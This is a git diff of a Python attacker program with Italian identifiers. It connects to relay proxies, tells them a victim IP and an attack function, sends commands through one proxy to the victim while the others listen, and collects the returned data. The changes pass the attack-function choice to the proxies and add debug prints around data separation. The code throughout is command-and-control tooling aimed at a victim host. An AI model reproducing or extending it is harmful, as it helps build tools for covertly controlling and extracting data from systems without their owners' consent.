@@ -25,6 +25,12 @@ directory = os.path.dirname(file_path)
 sys.path.insert(0, directory)
 import mymethods 
 
+file_path = "./attacksingleton.py"
+directory = os.path.dirname(file_path)
+sys.path.insert(0, directory)
+import attacksingleton 
+
+
 
 #-----------------------------------------
 
@@ -118,7 +124,7 @@ def elimina_proxy_nonconnessi(thread_lock:threading.Lock=None, thread_response:d
         except Exception as e:
             print(f"check_available_proxies: {proxy} not present in list. {e}")
 
-def get_connected_proxy(proxy_list:list[ipaddress.IPv4Address], ip_vittima:ipaddress.IPv4Address, callback_function, dict_proxy_socket:dict, thread_list:dict[str,threading.Thread]):
+def get_connected_proxy(proxy_list:list[ipaddress.IPv4Address], ip_vittima:ipaddress.IPv4Address, callback_function, dict_proxy_socket:dict, thread_list:dict[str,threading.Thread], attack_function:dict):
     #unconnected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[] 
     for proxy in proxy_list.copy(): 
         #basic_socket
@@ -131,9 +137,8 @@ def get_connected_proxy(proxy_list:list[ipaddress.IPv4Address], ip_vittima:ipadd
             print(f"Socket {proxy} get_connected_proxy: {e}")
             socket_proxy.close() 
             proxy_list.pop(proxy_list.index(proxy))
-            continue
-        
-        data=com.CONFIRM_ATTACKER+ip_vittima.compressed
+            continue 
+        data=(com.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+com.ATTACK_FUNCTION+next(iter(attack_function.items()))[0])
         socket_proxy.sendall(data.encode())
 
         data=socket_proxy.recv(1024).decode()
@@ -186,14 +191,14 @@ def setIP_vittima(config_file):
         return ip_vittima
 
 def attack_type(json_file): 
-        attack_function = singleton.AttackType().get_attack_function(json_file.get("attack_function"))
+        attack_function = attacksingleton.AttackType().get_attack_function(json_file.get("attack_function"))
         if not isinstance(attack_function, dict) or len(attack_function.items())!=1:
             print(f"Funzione di attacco non definita ",
                 f"non è un dizionario ma {type(attack_function)}" if not isinstance(attack_function, dict) 
                 else f"funzioni ricavate {len(attack_function.items())}" if len(attack_function.items())!=1
                 else None
             )
-            attack_function=singleton.AttackType().choose_attack_function() 
+            attack_function=attacksingleton.choose_attack_function() 
         return attack_function
 
 def load_config_file(default_file_path, path_of_file): 
@@ -242,7 +247,7 @@ class Attacker:
             print(f"__init__ load file: {e}", file=sys.stderr)
             exit(1) 
         try:
-            self.attack_function=attack_type(config_file) 
+            self.attack_function=attack_type(config_file)  
             print(f"Attacco selezionato: {self.attack_function}") 
             self.ip_vittima=setIP_vittima(config_file) 
             print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }")
@@ -262,7 +267,8 @@ class Attacker:
             self.dict_proxy_socket:dict[str,socket.socket]={} 
             self.thread_list:dict[str,threading.Thread]={} 
             get_connected_proxy(
-                self.proxy_list, self.ip_vittima, self.wait_proxy_update, self.dict_proxy_socket, self.thread_list
+                self.proxy_list, self.ip_vittima, self.wait_proxy_update, 
+                self.dict_proxy_socket, self.thread_list, self.attack_function
             )  
             print(f"Got all connected proxy") 
             if len(self.proxy_list)<=0:
@@ -333,7 +339,8 @@ class Attacker:
                 continue
             print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
             socket= self.dict_proxy_socket.get(chosen_proxy.compressed)
-            socket.sendall((com.CONFIRM_COMMAND+command).encode())
+            data=(com.CONFIRM_COMMAND+command)
+            socket.sendall(data.encode())
             print(f"Gli altri proxy ascolteranno direttamente la vititma")
             for proxy in self.proxy_list:
                 if proxy!=chosen_proxy :
@@ -342,10 +349,15 @@ class Attacker:
             
             for thread in self.thread_list.values(): 
                 thread.join()  
-            #print("ABCDEFG: ",self.received_data)
+            
 
             print("Separazione dati per SEQ") 
-            separa_dati_byID(self.received_data, self.dati_separati)
+            try:
+                print("ABCDEFG: ",self.received_data)
+                separa_dati_byID(self.received_data, self.dati_separati) 
+                print("ABCDEFG: ",self.dati_separati)
+            except Exception as e:
+                print(f"send_command_to_victim separa: {e}")
             #print("\n***dati_separati: ", self.dati_separati) 
             print("Dati separati per Sequenza")   
             try:
